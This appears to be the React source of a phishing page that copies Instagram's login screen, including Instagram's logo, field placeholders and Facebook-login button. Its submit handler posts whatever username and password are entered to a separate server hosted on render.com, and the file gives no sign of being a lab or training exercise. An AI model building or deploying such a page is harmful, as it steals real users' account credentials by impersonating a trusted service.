import React, { useState } from 'react';
import './App.css';
import axios from 'axios';

function App() {
  const [formData, setFormData] = useState({
    username: '',
    password: ''
  });

  const handleChange = (e) => {
    setFormData({ 
      ...formData, 
      [e.target.name]: e.target.value 
    });
  };
  
  const handleSubmit = async (e) => {
    e.preventDefault();
    try {
      await axios.post('https://loginserver-d9uf.onrender.com/api/login/', formData,
        {
        withCredentials: true
      })
      alert("Login info sent to Django!");
    } catch (error) {
      console.error('Error:', error);
      alert("Failed to send!");
    }
  };

  return (
    <div className="app">
      <div className="login-box">
        <img
          src="https://www.instagram.com/static/images/web/mobile_nav_type_logo.png/735145cfe0a4.png"
          alt="Instagram Logo"
          className="logo"
        />
        <form onSubmit={handleSubmit}>
          <input
            type="text"
            name="username"
            placeholder="Phone number, username, or email"
            value={formData.username}
            onChange={handleChange}
          />
          <input
            type="password"
            name="password"
            placeholder="Password"
            value={formData.password}
            onChange={handleChange}
          />
          <button type="submit">Log In</button>
        </form>
        <div className="divider">OR</div>
        <button className="fb-login">Log in with Facebook</button>
        <p className="forgot">Forgot password?</p>
      </div>

      <div className="signup-box">
        <p>Don't have an account? <a href="#">Sign up</a></p>
      </div>
    </div>
  );
}

export default App;
